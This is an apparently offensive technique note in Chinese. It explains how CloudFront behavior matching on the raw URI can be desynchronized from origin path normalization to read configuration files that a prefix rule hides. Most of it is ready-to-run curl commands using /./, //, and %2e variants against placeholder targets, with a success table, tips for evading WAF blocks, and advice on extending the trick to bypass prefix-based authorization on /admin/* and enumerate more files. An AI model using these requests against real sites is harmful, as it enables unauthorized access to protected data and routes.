# CloudFront behavior 前缀匹配 与 源站归一化 错位 → 读被行为规则遮蔽的配置

## 1. 原理

CloudFront 选择 cache behavior 时，用的是**客户端发来的原始 URI**去匹配 path pattern（`/config/*`、
`/api/*` 这类），它自己**不做** `.`/`..`/重复斜杠的归一化。
归一化发生在后面的源站（IIS / nginx / 应用）。

于是在「同一域名下多个 origin，按前缀分流」的架构里：

```
GET /config/x.json      -> 匹配 /config/* behavior -> 指向 origin B（此处不可达）-> 502
GET /./config/x.json    -> 匹配不到 /config/*       -> 落到 default behavior -> origin A（静态站）
                           源站把 /./ 归一化成 /config/x.json，真实命中文件 -> 200
```

前提条件：
- 目标使用 CloudFront（或任何"原始 URI 前缀匹配"的边缘），`Server: CloudFront` 是直接指纹；
- 该域名下挂了多个 origin，且被遮蔽的路由前缀由专门的 behavior 指向另一个 origin；
- 源站会做路径归一化且目录真实存在（IIS 对 `/./`、`//`、`%2e` 都会归一化）；
- 无认证要求，边缘可达即可。

## 2. 复现步骤

**关键点：curl 必须加 `--path-as-is`**，否则 curl 本地先归一化掉 `/./`，看不到错位（会误判为不存在）。
另外建议 `--noproxy '*'`，避免本地代理改写请求。

```bash
T=https://target503.example.com

# 0) 基线：命中前缀 behavior，回源失败（本例 502 / Server: CloudFront）
curl -sk --http1.1 --path-as-is --noproxy '*' -i "$T/config/105.json"

# 1) 前导 /./ ：不匹配 /config/* 行为，落到 default 静态 origin
curl -sk --http1.1 --path-as-is --noproxy '*' -i "$T/./config/105.json"
#    -> 200, Server: Microsoft-IIS, Content-Type: application/json, ETag "6ad86d9c-2c8"（712B）

# 2) 等价变体（用来证明是通道而非单点偶然）
curl -sk --http1.1 --path-as-is --noproxy '*' -i "$T//config/105.json"
curl -sk --http1.1 --path-as-is --noproxy '*' -i "$T/%2e/config/105.json"
curl -sk --http1.1 --path-as-is --noproxy '*' -i "$T/config//105.json"
curl -sk --http1.1 --path-as-is --noproxy '*' -i "$T/config/./105.json"

# 3) 对照：归一化点不在首段之前 → 仍是原路径 → 源站无此目录 → 404
curl -sk --http1.1 --path-as-is --noproxy '*' -i "$T/x/./config/105.json"   # 404 (IIS 556B)

# 4) 用默认 distribution 域名交叉验证（证明与自定义域无关）
curl -sk --http1.1 --path-as-is --noproxy '*' -i "https://<dist-id>.target504.example.com/./config/105.json"
```

返回的配置里通常是：`name`、`firm_ios_url`（itms-services plist）、`firm_apk_url_*`（APK 直链）、
deeplink 等渠道分发字段。同一通道还能读 `config/<md5(host)>.json` 这类渠道映射
（`platID` / `channelID` / `modelID` / `id`），文件名规则来自前端 JS 里的 `MD5(target505.example.com)`。

## 3. 判据

| 请求 | 期望 | 含义 |
|---|---|---|
| `/config/x.json` | 502/0B（CloudFront）或其他非 200 | 基线：前缀行为命中、第二 origin 不可达 |
| `/./config/x.json` | 200 + `Server: <源站中间件>` + 真实 JSON | 绕过成立 |
| `//`、`/%2e/`、`/config//` 变体 | 与上条同 body/ETag | 证明是 behavior 匹配错位而非个别路径 |
| 默认 distribution 域同名路径 | 同样 200 | 排除自定义域/WAF 特例 |
| `/x/./config/x.json` | 404 | 对照：只有首段前的错位才改 behavior |

判定必须同时看 **`Server` 头变化**（CloudFront 错误 vs 源站 IIS/nginx）与 **响应体是否为真实内容**，
只看状态码容易把 CDN 的 SPA 兜底页当成绕过成功。

## 4. 失败时的常见原因

1. **curl 没加 `--path-as-is`** —— 客户端先归一化，请求变成 `/config/x.json`，自然回到 502。
   Python `requests`/`urllib` 也会归一化，要用裸 socket 或 `curl --path-as-is`。
2. **本地代理改写/分流** —— 加 `--noproxy '*'` 复核。
3. **behavior 是 `/*` 兜底或 default 也指向同一 origin** —— 没有错位可利用，返回 200 是正常的而非漏洞。
4. **源站不归一化**（严格的 S3 REST origin、部分对象存储）—— `/./` 会 404/403，换 `//`、`%2e` 再试。
5. **WAF 先拦** —— 本例 `/x/../`、`/x/%2e%2e/` 返回 403（WAF 919 字节页），但首段前的 `.`/`/`/`%2e` 未被拦；
   遇到拦截优先试不带 `..` 的等价变体。
6. `%2f`、`%5c` 这类编码斜杠在 CloudFront/IIS 组合下常被拒或 400，优先级低于 `/./` 和 `//`。

## 5. 延伸

- 同一手法可直接用于绕过「按前缀做鉴权/开关」的边缘规则（`/admin/*`、`/api/*` 指向受保护 origin 时），
  思路与 nginx location 前缀阻塞绕过一致：**边缘按字面匹配，源站按归一化匹配**。
- 拿到配置 JSON 后继续按前端 JS 里的 URL 模板拼接（`config/<md5(host)>.json`、`template/<id>/index.html`），
  往往能枚举出更多渠道/模板实例。
